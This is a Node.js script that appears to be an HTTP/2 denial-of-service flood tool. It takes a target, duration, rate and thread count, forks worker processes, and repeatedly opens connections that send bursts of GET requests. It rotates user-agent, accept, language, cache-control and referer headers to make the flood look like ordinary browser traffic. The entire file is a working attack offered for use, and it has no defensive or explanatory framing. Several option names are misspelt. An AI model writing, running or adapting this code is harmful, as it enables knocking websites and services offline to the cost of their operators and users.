const http2 = require("http2")
const http = require("http")
const path = require("path")
const cluster = require("cluster")
const file = process.argv[1]
const getfile = path.basename(file)
const target = process.argv[2]
const time = process.argv[3]
const rate = process.argv[4]
const thread = process.argv[5]
if ( process.argv.length < 6 ) {
	console.log("Using: node " + getfile + " [target] [time] [rate] [thread]")
	process.exit()
}
const useragent = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edge/12.0',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edge/12.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edge/12.0',
]
const lang_header = [
    "ko-KR",
    "en-US",
    "zh-CN",
    "zh-TW",
    "ja-JP",
    "en-GB",
    "en-AU",
    "en-CA",
    "en-NZ",
    "en-ZA",
    "en-IN",
    "en-PH",
    "en-SG",
    "en-HK",
    "*",
    "en-US,en;q=0.5",
    "utf-8, iso-8859-1;q=0.5, *;q=0.1",
    "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5",
    "en-GB, en-US, en;q=0.9",
    "de-AT, de-DE;q=0.9, en;q=0.5",
    "cs;q=0.5",
    "da, en-gb;q=0.8, en;q=0.7",
    "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
    "en-US,en;q=0.9",
    "de-CH;q=0.7",
    "tr",
]
const accept_header = [
    '*/*',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5',
    'image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*',
    'image/avif,image/webp,*/*',
    'image/webp,*/*',
    'image/png,image/*;q=0.8,*/*;q=0.5',
    'image/webp,image/png,image/svg+xml,image/*;q=0.8,video/*;q=0.8,*/*;q=0.5',
    'image/png,image/svg+xml,image/*;q=0.8,video/*;q=0.8,*/*;q=0.5',
    'image/avif,image/webp,image/apng,image/*,*/*;q=0.8',
    'image/png,image/svg+xml,image/*;q=0.8, */*;q=0.5',
    'text/css,*/*;q=0.1',
    'text/css',
    'text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8',
    'application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*',
    'text/html, application/xhtml+xml, image/jxr, */*',
    'application/javascript, */*;q=0.8',
    'text/html, text/plain; q=0.6, */*; q=0.1',
    'application/graphql, application/json; q=0.8, application/xml; q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
]
const encoding = [
    "*",
    "gzip, deflate",
    "br;q=1.0, gzip;q=0.8, *;q=0.1",
    "gzip",
    "gzip, compress",
    "compress, deflate",
    "compress",
    "gzip, deflate, br",
    "deflate",
    "gzip, deflate, lzma, sdch",
    "deflate",
]
const controle_header = [
    'max-age=604800',
    's-maxage=604800',
    'max-stale',
    'min-fresh',
    'private',
    'public',
    'no-cache',
    'no-store',
    'no-transform',
    'stale-if-error',
    'only-if-cached',
    'max-age=0',
    'must-understand, no-store',
    'public, max-age=604800, immutable',
    'max-age=604800, stale-while-revalidate=86400',
    'max-stale=3600',
    'min-fresh=600',
    'max-age=31536000, immutable',
    'max-age=604800, stale-if-error=86400',
    'public, max-age=604800',
    'no-cache, no-store,private, max-age=0, must-revalidate',
    'no-cache, no-store,private, s-maxage=604800, must-revalidate',
    'no-cache, no-store,private, max-age=604800, must-revalidate'
]
const referer = [
	"https://check-host.net",
	"https://dstat.cc",
	"https://google.com",
	"https://nminh2302.site",
	"https://nasa.gov",
	"https://check-host.cc",
	"https://dstat.love",
	"https://amazon.com",
	"https://paypal.com",
]
const agent = new http.Agent({
	KeepAlive: true,
	KeepAliceMsecs: time,
	maxSockets: Infinity,
	maxTotalSockets: Infinity,
})
const options = {
	hostname: target,
	port: 443,
	method: "GET",
	timeout: 5000,
	protocol: "h2",
	globalAgent: agent,
	path: "/",
	header: {
		"user-agent": useragent[Math.floor(Math.random()* useragent.length)],
		"cache-control": controle_header[Math.floor(Math.random()* controle_header.length)],
		"orgin": target,
		"protocol": "h2",
		"accept-language": lang_header[Math.floor(Math.random()* lang_header.length)],
		"referer": referer[Math.floor(Math.random()* referer.length)],
		"accept": accept_header[Math.floor(Math.random()* accept_header.length)],
		"method": "GET",
		"globalAgent": agent,
	},
	setting: {
		initialWindowSize: 6291456,
		maxConcurrentStreams: 100,
		maxHeaderListSize: 262144,
		enablePush: false,
		headerTableSize: 65536,
	},
}
function flood() {
	const client = http2.connect(target)
	client.on("connect", () => {
		setInterval(() => {
			for ( let i = 0;i < rate;i++) {
				const request = client.request(options);
				const request1 = client.request(options);
				const request2 = client.request(options);
   				request.end();
   				request1.end();
	   			request2.end();
				request.on("close", () => {
					request.destroy()
					return
				})
				request.on("error", () => {
					request.destroy()
					return
				})
			};
		}, 500);
	})
}
if ( cluster.isMaster ) {
	for(let i = 0;i < thread;i++) {
		cluster.fork()
	}
} else {
	setInterval(() => {
		flood()
	},1)
}
setTimeout(() => {
	process.exit()
}, time * 1000)







